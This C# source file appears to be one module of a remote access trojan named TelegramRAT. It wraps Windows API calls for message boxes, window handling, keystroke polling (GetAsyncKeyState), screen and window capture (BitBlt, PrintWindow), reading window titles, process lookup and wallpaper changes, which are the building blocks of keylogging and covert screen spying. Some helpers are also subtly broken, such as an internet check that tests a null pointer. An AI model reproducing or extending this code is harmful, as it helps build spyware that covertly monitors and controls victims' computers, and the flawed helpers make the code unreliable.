using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Threading.Tasks;


namespace TelegramRAT
{
    static class WinAPI
    {
        const string u32 = "user32.dll";


        [DllImport(u32, EntryPoint = "MessageBox")]
        static extern int MessageBox(IntPtr ParentWindow, string Text, string Caption, uint Type);

        public static int ShowMessageBox(string Text, string Caption)
        {
            return MessageBox(GetForegroundWindow(), Text, Caption, (uint)MsgBoxFlag.MB_APPLMODAL);
        }

        public static async Task<int> ShowMessageBoxAsync(string Text, string Caption, MsgBoxFlag Flag)
        {
            int answer = await Task.Run<int>(() => MessageBox(GetForegroundWindow(), Text, Caption, (uint)MsgBoxFlag.MB_APPLMODAL | (uint)Flag));
            
            return answer;
        }

        public enum MsgBoxFlag : ulong
        {
            MB_APPLMODAL = 0x00000000L,
            MB_ICONINFORMATION = 0x00000040L,
            MB_ICONEXCLAMATION = 0x00000030L,
            MB_ICONQUESTION = 0x00000020L,
            MB_ICONSTOP = 0x00000010L,
            MB_YESNO = 0x00000004L
        }

        [DllImport(u32, EntryPoint = "GetSystemMetrics")]
        static extern int GetSystemMetrics(int index);

        enum MetricsIndexes : int
        {
            SM_CXSCREEN = 0,
            SM_CYSCREEN = 1,
            SM_CXFULLSCREEN = 16,
            SM_CYFULLSCREEN = 17,
            SM_CXVIRTUALSCREEN = 78,
            SM_CYVIRTUALSCREEN = 79
        }

        public static Rectangle GetScreenBounds()
        {
            return new Rectangle(0, 0, GetSystemMetrics((int)MetricsIndexes.SM_CXVIRTUALSCREEN), GetSystemMetrics((int)MetricsIndexes.SM_CYSCREEN));
        }


        [DllImport("wininet.dll", EntryPoint = "InternetGetConnectedState")]
        static extern bool GetInternetConnection(IntPtr flags, int reserved = 0);

        public static bool CheckInternetConnection()
        {
            IntPtr ptr = IntPtr.Zero;

            GetInternetConnection(ptr);

            long a = ptr.ToInt64();

            if ((a & 0x20) != 0x20)
            {
                return true;
            }
            return false;
        }

        [DllImport(u32, EntryPoint = "FindWindowA")]
        public static extern IntPtr FindWindow(string ClassName, string Caption);

        [DllImport(u32, EntryPoint = "GetForegroundWindow")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport(u32, CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        public const int SPI_SETDESKWALLPAPER = 20;
        public const int SPIF_UPDATEINIFILE = 0x01;
        public const int SPIF_SENDWININICHANGE = 0x02;

        public const int WM_SYSCOMMAND = 0x0112;
        public const int SC_MINIMIZE = 0xF020;
        public const int SC_MAXIMIZE = 0xF030;
        public const int SC_RESTORE = 0xF120;
        public const int SC_CLOSE = 0xF060;

        [DllImport(u32, EntryPoint = "CloseWindow")]
        public static extern bool MinimizeWindow(IntPtr handle);

        [DllImport(u32, SetLastError = true)]
        public static extern int GetWindowThreadProcessId(IntPtr hWnd, out int processId);

        [DllImport(u32, EntryPoint = "GetAsyncKeyState")]
        public static extern short GetAsyncKeyState(uint key);

        [DllImport(u32, EntryPoint = "MapVirtualKeyA")]
        public static extern char MapVirtualKey(uint keyCode, uint mapType = 2);

        [DllImport(u32, EntryPoint = "PostMessageA")]
        public static extern bool PostMessage(IntPtr hWnd, int msg, int wParam, int lParam);


        [DllImport("user32.dll", EntryPoint = "SendMessage", CharSet = CharSet.Auto)]
        public static extern bool SendMessage(IntPtr hWnd, uint Msg, int wParam, StringBuilder lParam);

        [DllImport("user32.dll")]
        public static extern IntPtr SendMessage(int hWnd, int Msg, int wparam, int lparam);

        const int WM_GETTEXT = 0x000D;
        const int WM_GETTEXTLENGTH = 0x000E;

        public static string GetWindowTitle(IntPtr hWnd)
        {
            int titleSize = SendMessage((int)hWnd, WM_GETTEXTLENGTH, 0, 0).ToInt32();

            if (titleSize == 0)
                return String.Empty;

            StringBuilder title = new StringBuilder(titleSize + 1);

            SendMessage(hWnd, (int)WM_GETTEXT, title.Capacity, title);

            return title.ToString();
        }

        [DllImport(u32, EntryPoint = "PrintWindow")]
        public static extern bool PrintWindow(IntPtr hWnd, IntPtr hDcBlt, uint flags);

        [DllImport(u32, EntryPoint = "GetWindowRect")]

        static extern bool GetWindowRect(IntPtr hWnd, IntPtr Rect);
        [DllImport(u32, EntryPoint = "GetWindowRect")]
        static extern unsafe bool GetWindowRect(IntPtr hWnd, Rectangle* Rect);

        public static unsafe Rectangle GetWindowBounds(IntPtr hWnd)
        {
            Rectangle rect = new Rectangle();
            Rectangle* ptr = &rect;
            GetWindowRect(hWnd, ptr);
            rect.Width -= rect.X;
            rect.Height -= rect.Y;
            return rect;
        }

        public const int SC_MONITORPOWER = 0xF170;

        [DllImport(u32, EntryPoint = "IsWindow")]
        public static extern bool IsWindow(IntPtr hWnd);

        [DllImport("Oleacc.dll", EntryPoint = "GetProcessHandleFromHwnd")]
        public static extern IntPtr GetProcessHandleFromWindow(IntPtr hWnd);

        [DllImport("Kernel32.dll", EntryPoint = "GetProcessId")]
        public static extern int GetProcessId(IntPtr procHandle);

        [DllImport(u32, EntryPoint = "GetDC")]
        public static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("Gdi32.dll", EntryPoint = "BitBlt")]
        public static extern bool BitBlt(
            IntPtr destHdc,
            int x,
            int y,
            int width,
            int height,
            IntPtr srcHdc,
            int x1,
            int y1,
            int rop);

        [DllImport(u32, EntryPoint = "GetCursorPos")]
        public static extern bool GetCursorPos(out Point pt);

        [DllImport(u32, EntryPoint = "GetClientRect")]
        public static extern bool GetClientRect(IntPtr hWnd, out Rectangle rect);
    }
}
